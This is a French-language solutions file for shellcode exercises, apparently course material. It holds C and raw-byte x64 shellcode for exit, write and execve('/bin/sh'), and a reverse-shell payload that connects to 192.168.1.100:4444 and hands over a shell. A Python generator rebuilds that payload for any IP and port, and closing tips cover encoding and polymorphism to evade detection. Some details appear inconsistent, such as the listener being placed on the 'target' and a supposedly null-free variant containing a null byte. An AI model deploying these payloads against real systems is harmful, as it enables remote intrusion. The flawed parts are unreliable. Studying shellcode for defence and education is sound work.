# Solutions - Shellcode Linux

## Avertissement

Ce module est uniquement à des fins éducatives pour comprendre le développement de shellcode et les techniques d'exploitation. L'utilisation de ces techniques sans autorisation est illégale.

---

## Exercice 1 : Découverte (Très facile)

**Objectif** : Comprendre les syscalls Linux et exécuter un simple exit

### Solution

```c
/*
 * Shellcode basique - Exit
 *
 * Compilation :
 * gcc -z execstack -no-pie shellcode_exit.c -o shellcode_exit
 */

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

/*
 * Shellcode qui appelle exit(0)
 *
 * En assembleur x64 :
 *   mov rax, 60      ; syscall exit = 60
 *   xor rdi, rdi     ; code de sortie = 0
 *   syscall          ; appel système
 */
unsigned char shellcode_exit[] =
    "\x48\xc7\xc0\x3c\x00\x00\x00"  // mov rax, 60
    "\x48\x31\xff"                   // xor rdi, rdi
    "\x0f\x05";                      // syscall

int main()
{
    printf("[*] Démonstration Shellcode Exit\n");
    printf("[*] Taille du shellcode : %ld bytes\n", strlen((char*)shellcode_exit));

    // Affiche le shellcode en hexadécimal
    printf("[*] Shellcode (hex) : ");
    for(int i = 0; i < strlen((char*)shellcode_exit); i++) {
        printf("\\x%02x", shellcode_exit[i]);
    }
    printf("\n\n");

    // Alloue de la mémoire exécutable
    // mmap permet de créer une zone mémoire avec les permissions souhaitées
    void *exec_mem = mmap(NULL, sizeof(shellcode_exit),
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copie le shellcode dans la mémoire exécutable
    memcpy(exec_mem, shellcode_exit, sizeof(shellcode_exit));

    printf("[+] Shellcode copié en mémoire exécutable\n");
    printf("[*] Adresse : %p\n", exec_mem);
    printf("[*] Exécution du shellcode...\n\n");

    // Cast vers un pointeur de fonction et exécution
    void (*func)() = (void(*)())exec_mem;
    func();

    // Cette ligne ne sera jamais atteinte car le shellcode fait exit()
    printf("[!] Ceci ne devrait jamais s'afficher\n");

    return 0;
}
```

**Explications** :
- Un syscall Linux s'effectue en plaçant le numéro dans RAX et les arguments dans RDI, RSI, RDX...
- Le syscall `exit` a le numéro 60 en x64
- `xor rdi, rdi` met RDI à 0 (code de sortie)
- `syscall` effectue l'appel système

**Génération du shellcode en assembleur** :
```nasm
; exit.asm
section .text
global _start

_start:
    mov rax, 60        ; syscall exit
    xor rdi, rdi       ; status = 0
    syscall

; Assemblage :
; nasm -f elf64 exit.asm -o exit.o
; ld exit.o -o exit
; objdump -d exit | grep "^ " | cut -f2
```

---

## Exercice 2 : Modification (Facile)

**Objectif** : Créer un shellcode qui écrit "Hello World" puis exit

### Solution

```c
/*
 * Shellcode Write - Affiche "Hello World"
 *
 * Compilation :
 * gcc -z execstack -no-pie shellcode_write.c -o shellcode_write
 */

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

/*
 * Shellcode qui affiche "Hello World\n" et exit
 *
 * Assembleur x64 :
 *   jmp short message      ; Saut vers le message
 * code:
 *   pop rsi                ; RSI = adresse du message
 *   mov rax, 1             ; syscall write = 1
 *   mov rdi, 1             ; stdout = 1
 *   mov rdx, 13            ; longueur = 13
 *   syscall                ; appel write
 *   mov rax, 60            ; syscall exit = 60
 *   xor rdi, rdi           ; code = 0
 *   syscall                ; appel exit
 * message:
 *   call code              ; Push l'adresse de retour (message) sur la pile
 *   db "Hello World!",0x0a
 */
unsigned char shellcode_write[] =
    "\xeb\x1e"                           // jmp short message
    "\x5e"                               // pop rsi
    "\x48\xc7\xc0\x01\x00\x00\x00"       // mov rax, 1
    "\x48\xc7\xc7\x01\x00\x00\x00"       // mov rdi, 1
    "\x48\xc7\xc2\x0d\x00\x00\x00"       // mov rdx, 13
    "\x0f\x05"                           // syscall
    "\x48\xc7\xc0\x3c\x00\x00\x00"       // mov rax, 60
    "\x48\x31\xff"                       // xor rdi, rdi
    "\x0f\x05"                           // syscall
    "\xe8\xdd\xff\xff\xff"               // call code
    "Hello World!\x0a";                  // message

int main()
{
    printf("[*] Démonstration Shellcode Write\n");
    printf("[*] Taille du shellcode : %ld bytes\n", sizeof(shellcode_write) - 1);

    // Alloue de la mémoire exécutable
    void *exec_mem = mmap(NULL, sizeof(shellcode_write),
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copie et exécute
    memcpy(exec_mem, shellcode_write, sizeof(shellcode_write));

    printf("[+] Exécution du shellcode...\n\n");

    void (*func)() = (void(*)())exec_mem;
    func();

    return 0;
}
```

**Explications** :
- Technique JMP-CALL-POP pour obtenir l'adresse du message
- `jmp message` saute au label message
- `call code` push l'adresse de retour (le message) et saute à code
- `pop rsi` récupère l'adresse du message dans RSI
- syscall `write(1, message, 13)` affiche le message
- syscall `exit(0)` termine proprement

**Version optimisée sans NULL bytes** :
```c
// Utiliser XOR au lieu de MOV pour éviter les bytes nuls
// xor eax, eax ; inc eax au lieu de mov rax, 1
```

---

## Exercice 3 : Création (Moyen)

**Objectif** : Shellcode execve("/bin/sh") pour spawn un shell

### Solution

```c
/*
 * Shellcode Execve - Spawn Shell
 *
 * Compilation :
 * gcc -z execstack -no-pie shellcode_execve.c -o shellcode_execve
 */

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

/*
 * Shellcode qui exécute execve("/bin/sh", NULL, NULL)
 *
 * Assembleur x64 :
 *   xor rsi, rsi           ; argv = NULL
 *   xor rdx, rdx           ; envp = NULL
 *   mov rbx, '/bin//sh'    ; chemin (// = padding)
 *   push rdx               ; null terminator
 *   push rbx               ; push le chemin
 *   mov rdi, rsp           ; RDI = adresse de "/bin//sh"
 *   mov rax, 59            ; syscall execve = 59
 *   syscall
 */
unsigned char shellcode_execve[] =
    "\x48\x31\xf6"                      // xor rsi, rsi
    "\x48\x31\xd2"                      // xor rdx, rdx
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f"  // mov rbx, '/bin//sh'
    "\x73\x68"
    "\x52"                              // push rdx
    "\x53"                              // push rbx
    "\x48\x89\xe7"                      // mov rdi, rsp
    "\x48\xc7\xc0\x3b\x00\x00\x00"      // mov rax, 59
    "\x0f\x05";                         // syscall

int main()
{
    printf("[*] Démonstration Shellcode Execve\n");
    printf("[*] Taille du shellcode : %ld bytes\n", sizeof(shellcode_execve) - 1);
    printf("[*] Ce shellcode va spawn un shell /bin/sh\n\n");

    // Vérification : pas de NULL bytes dans le shellcode
    int has_null = 0;
    for(int i = 0; i < sizeof(shellcode_execve) - 1; i++) {
        if(shellcode_execve[i] == 0) {
            printf("[!] WARNING: NULL byte trouvé à l'offset %d\n", i);
            has_null = 1;
        }
    }

    if(!has_null) {
        printf("[+] Aucun NULL byte dans le shellcode\n");
    }

    // Alloue de la mémoire exécutable
    void *exec_mem = mmap(NULL, sizeof(shellcode_execve),
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copie et exécute
    memcpy(exec_mem, shellcode_execve, sizeof(shellcode_execve));

    printf("[+] Shellcode copié en mémoire\n");
    printf("[*] Exécution...\n\n");

    void (*func)() = (void(*)())exec_mem;
    func();

    // Ne sera jamais atteint
    return 0;
}
```

**Explications détaillées** :

1. **Éviter les NULL bytes** :
   - Utiliser `xor rsi, rsi` au lieu de `mov rsi, 0`
   - `/bin//sh` au lieu de `/bin/sh` pour remplir 8 bytes

2. **Structure du syscall execve** :
   - RAX = 59 (numéro du syscall execve)
   - RDI = pointeur vers le chemin du programme
   - RSI = pointeur vers argv (tableau d'arguments)
   - RDX = pointeur vers envp (variables d'environnement)

3. **Technique de la pile** :
   - Push NULL (terminateur)
   - Push la chaîne "/bin//sh"
   - RSP pointe maintenant vers la chaîne

**Version avec arguments** :
```c
/*
 * Shellcode execve("/bin/sh", ["/bin/sh", "-c", "commande"], NULL)
 */
unsigned char shellcode_execve_args[] =
    "\x48\x31\xd2"                      // xor rdx, rdx
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x73"  // mov rbx, '/bin/sh'
    "\x68\x00"
    "\x53"                              // push rbx
    "\x48\x89\xe7"                      // mov rdi, rsp (arg0)
    "\x48\x31\xc0"                      // xor rax, rax
    "\x50"                              // push NULL (terminateur argv)
    "\x57"                              // push rdi (arg0)
    "\x48\x89\xe6"                      // mov rsi, rsp (argv)
    "\x48\xc7\xc0\x3b\x00\x00\x00"      // mov rax, 59
    "\x0f\x05";                         // syscall
```

---

## Exercice 4 : Challenge (Difficile)

**Objectif** : Shellcode polymorphique position-independent avec reverse shell

### Solution

```c
/*
 * Shellcode Reverse Shell
 *
 * Fonctionnalités :
 * - Position-independent code (PIC)
 * - Pas de NULL bytes
 * - Connexion TCP vers un serveur distant
 * - Duplication des file descriptors
 * - Spawn shell
 *
 * Compilation :
 * gcc -z execstack -no-pie shellcode_reverse.c -o shellcode_reverse
 */

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <arpa/inet.h>

/*
 * Configuration
 * IP: 192.168.1.100
 * Port: 4444
 *
 * Convertir l'IP en hex inversé (little-endian) :
 * 192.168.1.100 = 0xC0A80164
 * En little-endian : 0x6401A8C0
 *
 * Port 4444 = 0x115C
 * En big-endian (network order) : 0x5C11
 */
unsigned char shellcode_reverse[] =
    // socket(AF_INET, SOCK_STREAM, 0)
    "\x48\x31\xc0"                      // xor rax, rax
    "\x48\x31\xff"                      // xor rdi, rdi
    "\x48\x31\xf6"                      // xor rsi, rsi
    "\x48\x31\xd2"                      // xor rdx, rdx
    "\x48\x83\xc0\x29"                  // add rax, 41 (syscall socket)
    "\x48\x83\xc7\x02"                  // add rdi, 2 (AF_INET)
    "\x48\x83\xc6\x01"                  // add rsi, 1 (SOCK_STREAM)
    "\x0f\x05"                          // syscall
    "\x48\x89\xc7"                      // mov rdi, rax (save socket fd)

    // struct sockaddr_in
    "\x48\x31\xc0"                      // xor rax, rax
    "\x50"                              // push 0
    "\x68\x64\x01\xa8\xc0"              // push 0xc0a80164 (IP: 192.168.1.100)
    "\x66\x68\x11\x5c"                  // push word 0x5c11 (port 4444)
    "\x66\x6a\x02"                      // push word 2 (AF_INET)
    "\x48\x89\xe6"                      // mov rsi, rsp (adresse struct)

    // connect(sock, &addr, 16)
    "\x48\x31\xd2"                      // xor rdx, rdx
    "\x48\x83\xc2\x10"                  // add rdx, 16 (sizeof struct)
    "\x48\x31\xc0"                      // xor rax, rax
    "\x48\x83\xc0\x2a"                  // add rax, 42 (syscall connect)
    "\x0f\x05"                          // syscall

    // dup2(sock, 0) dup2(sock, 1) dup2(sock, 2)
    "\x48\x31\xc9"                      // xor rcx, rcx
    "\x48\x83\xc1\x03"                  // add rcx, 3 (compteur)
    // boucle:
    "\x48\x31\xc0"                      // xor rax, rax
    "\x48\x83\xc0\x21"                  // add rax, 33 (syscall dup2)
    "\x48\x89\xfe"                      // mov rsi, rdi (sauvegarde rdi)
    "\x48\xff\xc9"                      // dec rcx
    "\x48\x89\xcf"                      // mov rdi, rcx
    "\x0f\x05"                          // syscall
    "\x48\x89\xf7"                      // mov rdi, rsi (restore rdi)
    "\x48\xff\xc1"                      // inc rcx
    "\xe2\xe6"                          // loop

    // execve("/bin/sh", NULL, NULL)
    "\x48\x31\xf6"                      // xor rsi, rsi
    "\x48\x31\xd2"                      // xor rdx, rdx
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f"  // mov rbx, '/bin//sh'
    "\x73\x68"
    "\x52"                              // push rdx
    "\x53"                              // push rbx
    "\x48\x89\xe7"                      // mov rdi, rsp
    "\x48\x31\xc0"                      // xor rax, rax
    "\x48\x83\xc0\x3b"                  // add rax, 59 (syscall execve)
    "\x0f\x05";                         // syscall

int main()
{
    printf("[*] Démonstration Reverse Shell Shellcode\n");
    printf("[*] Taille : %ld bytes\n", sizeof(shellcode_reverse) - 1);
    printf("[*] Target : 192.168.1.100:4444\n\n");

    // Vérification NULL bytes
    int has_null = 0;
    for(int i = 0; i < sizeof(shellcode_reverse) - 1; i++) {
        if(shellcode_reverse[i] == 0) {
            has_null = 1;
            break;
        }
    }

    if(!has_null) {
        printf("[+] Pas de NULL bytes détectés\n");
    } else {
        printf("[!] WARNING: NULL bytes présents\n");
    }

    // Affiche le shellcode
    printf("\n[*] Shellcode (format C) :\n\"");
    for(int i = 0; i < sizeof(shellcode_reverse) - 1; i++) {
        if(i > 0 && i % 12 == 0) printf("\"\n\"");
        printf("\\x%02x", (unsigned char)shellcode_reverse[i]);
    }
    printf("\"\n\n");

    printf("[*] Pour tester, lancez sur la machine cible :\n");
    printf("    nc -lvp 4444\n\n");

    printf("[?] Voulez-vous exécuter le shellcode ? (y/n) : ");
    char choice;
    scanf(" %c", &choice);

    if(choice == 'y' || choice == 'Y') {
        void *exec_mem = mmap(NULL, sizeof(shellcode_reverse),
                              PROT_READ | PROT_WRITE | PROT_EXEC,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

        if (exec_mem == MAP_FAILED) {
            perror("mmap");
            return 1;
        }

        memcpy(exec_mem, shellcode_reverse, sizeof(shellcode_reverse));

        printf("[+] Connexion en cours...\n\n");

        void (*func)() = (void(*)())exec_mem;
        func();
    }

    return 0;
}
```

**Générateur de shellcode personnalisé** :

```python
#!/usr/bin/env python3
"""
Générateur de shellcode reverse shell
Usage: python3 gen_shellcode.py <IP> <PORT>
"""

import sys
import socket
import struct

def ip_to_hex(ip):
    """Convertit une IP en format hexadécimal little-endian"""
    parts = ip.split('.')
    hex_ip = struct.pack('BBBB', int(parts[0]), int(parts[1]),
                         int(parts[2]), int(parts[3]))
    return hex_ip

def port_to_hex(port):
    """Convertit un port en format hexadécimal big-endian"""
    return struct.pack('!H', int(port))

def generate_shellcode(ip, port):
    """Génère le shellcode avec IP et port personnalisés"""

    shellcode_template = (
        b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2"
        b"\x48\x83\xc0\x29\x48\x83\xc7\x02\x48\x83\xc6\x01"
        b"\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x68"
    )

    shellcode_template += ip_to_hex(ip)
    shellcode_template += b"\x66\x68"
    shellcode_template += port_to_hex(port)

    shellcode_template += (
        b"\x66\x6a\x02\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x10"
        b"\x48\x31\xc0\x48\x83\xc0\x2a\x0f\x05\x48\x31\xc9"
        b"\x48\x83\xc1\x03\x48\x31\xc0\x48\x83\xc0\x21"
        b"\x48\x89\xfe\x48\xff\xc9\x48\x89\xcf\x0f\x05"
        b"\x48\x89\xf7\x48\xff\xc1\xe2\xe6\x48\x31\xf6"
        b"\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
        b"\x52\x53\x48\x89\xe7\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05"
    )

    return shellcode_template

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <IP> <PORT>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]

    shellcode = generate_shellcode(ip, port)

    print(f"[*] Shellcode généré pour {ip}:{port}")
    print(f"[*] Taille : {len(shellcode)} bytes")
    print("\n[*] Format C :")
    print('unsigned char shellcode[] = "', end='')
    for i, byte in enumerate(shellcode):
        if i > 0 and i % 12 == 0:
            print('"\n"', end='')
        print(f"\\x{byte:02x}", end='')
    print('";')

    print("\n\n[*] Format Python :")
    print("shellcode = b'", end='')
    for byte in shellcode:
        print(f"\\x{byte:02x}", end='')
    print("'")
```

**Explications avancées** :

1. **Position-Independent Code (PIC)** :
   - Pas de références absolues
   - Utilise la pile et les registres
   - Fonctionne quelle que soit l'adresse de chargement

2. **Éviter les NULL bytes** :
   - `xor` au lieu de `mov 0`
   - `add` au lieu de valeurs directes
   - Padding avec `//` dans les chemins

3. **Syscalls utilisés** :
   - `socket(2, 1, 0)` : crée un socket TCP
   - `connect(sock, addr, len)` : connexion au serveur
   - `dup2(sock, fd)` : redirige stdin/stdout/stderr
   - `execve("/bin/sh", NULL, NULL)` : spawn shell

4. **Encodage** :
   - Pour éviter la détection, encoder le shellcode
   - XOR avec une clé
   - Stub décodeur au début

---

## Points clés à retenir

1. **Architecture shellcode** :
   - Code machine pur, pas de libc
   - Appels système directs via `syscall`
   - Pas de NULL bytes pour injection

2. **Techniques essentielles** :
   - JMP-CALL-POP pour les chaînes
   - XOR pour initialiser à zéro
   - Position-independent code

3. **Optimisation** :
   - Taille minimale
   - Pas de bad characters
   - Performance

4. **Détection et évasion** :
   - Polymorphisme (changement de forme)
   - Encodage/chiffrement
   - Anti-debug

## Ressources complémentaires

- The Shellcoder's Handbook
- Linux syscall reference: https://syscalls.kernelgott.esdm.co
- Metasploit shellcode modules
- pwntools pour la génération de shellcode
